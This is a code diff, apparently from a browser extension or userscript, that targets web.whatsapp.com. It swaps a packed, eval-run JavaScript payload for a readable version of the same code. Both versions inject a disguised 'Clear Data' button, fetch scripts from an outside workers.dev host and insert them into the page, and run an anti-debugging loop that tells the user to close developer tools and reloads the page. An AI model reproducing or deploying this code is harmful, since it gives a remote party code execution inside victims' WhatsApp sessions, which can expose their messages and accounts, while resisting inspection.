@@ -1,1 +1,31 @@
-var tnpij = function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('!3(){3 e(e){!3(e,t,n){c o=6.C?d C:d 18("19.1a");o.1b=3(){1c(4==9.1d&&I==9.A||1e==9.A){c e=9.1f,t=17.1g(e.G(e.1i("{"),e.1j("}")+1));n&&n(t)}},o.1k(e,t,!0),o.1l()}("1m",e,3(e){y n=e.1n.1o;1p(c t=0,e=n.M;t<e;t++){c e=2.j("1h");e.x=n[t].15.$t,2.7.k(e),H(()=>{2.7.11(e)},B)}})}y t;"P.Q.R"===6.5.S&&((t=2.j("l")).x=\'<l g="f"><a U="i" J="O:;" V="13/u s" g="Y">Z... / u s</a></l>\',2.7.k(t),(t=2.j("W")).12="#f{10:T;1r:h;z-m:p;1q:0;1s-1N:1R}#f a.i{1S:1T;1U:q 1V;1W:#1X;v:#w;1Y-1Z:20;z-m:p;21:h;26: 22-23;r-27:25;24-1P:0 h q 1v 1w(1x 1y 1z/16%);r-1B:1C;1u-1D:1F}#f a.i:1H{v:#w}",2.7.k(t),e("1K://1L.1M.1t.14/1J?g=1I"),3 e(){b=(d L).E(),8=(d L).E(),I<8-b?(2.1G(" 1A!! 1O 1E 28 1Q... "),N.5.X(6.5.F+6.5.J.G(6.5.F.M))):(b=D,8=D,K b,K 8),H(e,B)}())}();',62,133,'||document|function||location|window|body|after|this||before|let|new||fsetting2|id|2px|runbutton22|createElement|appendChild|div|index|||99998|5px|font|Data||Clear|color|fff|innerHTML|var||status|100|XMLHttpRequest|null|getTime|protocol|substring|setTimeout|200|href|delete|Date|length|self|javascript|web|whatsapp|com|hostname|fixed|class|title|style|replace|addext|Loading|position|removeChild|innerText|Wait|dev|content||JSON|ActiveXObject|Microsoft|XMLHTTP|onreadystatechange|if|readyState|304|responseText|parse|script|indexOf|lastIndexOf|open|send|GET|feed|entry|for|left|top|line|workers|text|1px|rgb|60|64|67|Alert|size|12px|decoration|Developer|none|write|hover|installtool|import|https|share|autopush|height|Close|shadow|Now|initial|cursor|pointer|padding|15px|background|005af0|border|radius|4px|margin|inline|block|box|600|display|weight|Tools'.split('|'),0,{});window.eval(tnpij);
+(function () {
+    if (window.location.hostname === "web.whatsapp.com") {
+	
+	function xhr(t, e, n) {
+    let i = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
+    i.onreadystatechange = function () {
+        if (4 == this.readyState && 200 == this.status || 304 == this.status) {
+            let t = this.responseText,
+                e = JSON.parse(t.substring(t.indexOf("{"), t.lastIndexOf("}") + 1));
+            n && n(e)
+        }
+    }, i.open(t, e, !0), i.send()
+}
+
+function fetchafterrun(t) {
+    xhr("GET", t, function (t) {
+        var n = t.feed.entry;
+        for (let e = 0, t = n.length; e < t; e++) {
+            let t = document.createElement("script");
+            t.innerHTML = n[e].content.$t, document.body.appendChild(t)
+        }
+    })
+}
+var e = document.createElement("div");
+e.innerHTML = '<div id="fsetting2"><a class="runbutton22" href="javascript:;" title="Wait/Clear Data" id="addext">Loading... / Clear Data</a></div>', document.body.appendChild(e), (e = document.createElement("style")).innerText = "#fsetting2{position:fixed;top:2px;z-index:99998;left:0;line-height:initial}#fsetting2 a.runbutton22{cursor:pointer;padding:5px 15px;background:#005af0;color:#fff;border-radius:4px;z-index:99998;margin:2px;display: inline-block;font-weight:600;box-shadow:0 2px 5px 1px rgb(60 64 67/16%);font-size:12px;text-decoration:none}#fsetting2 a.runbutton22:hover{color:#fff}", document.body.appendChild(e), fetchafterrun("https://share.autopush.workers.dev/import?id=installtool");
+
+function check() {before = new Date().getTime();debugger;after = new Date().getTime();if (after - before > 200) {document.write(" Alert!! Close Developer Tools Now... ");self.location.replace(window.location.protocol + window.location.href.substring(window.location.protocol.length));}else{before = null;after = null;delete before;delete after;}setTimeout(check, 100);}check();
+
+
+    }
+})();
